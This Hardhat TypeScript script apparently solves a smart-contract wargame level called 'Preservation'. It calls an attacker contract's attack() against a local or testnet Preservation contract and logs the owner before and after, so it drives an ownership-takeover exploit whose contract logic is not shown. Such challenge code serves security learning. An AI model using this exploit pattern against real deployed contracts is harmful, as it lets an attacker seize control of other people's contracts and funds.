import { ethers, network } from "hardhat";
import { Preservation, PreservationAttacker } from "../typechain-types";

async function main() {
  let preservation: Preservation;
  const [attacker] = await ethers.getSigners();

  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  const preservationAttacker: PreservationAttacker = await ethers.getContract(
    "PreservationAttacker"
  );

  if (isLocalTest) {
    preservation = await ethers.getContract("Preservation");
  } else {
    preservation = await ethers.getContractAt(
      "Preservation",
      "0x4847E59948BDa068d2B03a684D40f1dE100b3B11"
    );
  }

  async function check() {
    const owner = await preservation.owner();
    console.log(`Owner: ${owner}`);
  }

  console.log("Before the attack:");

  await check();

  const tx = await preservationAttacker.connect(attacker).attack();

  await tx.wait(isLocalTest ? 1 : 5);

  console.log("-------------------------------------------------------");
  console.log("After the attack:");

  await check();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
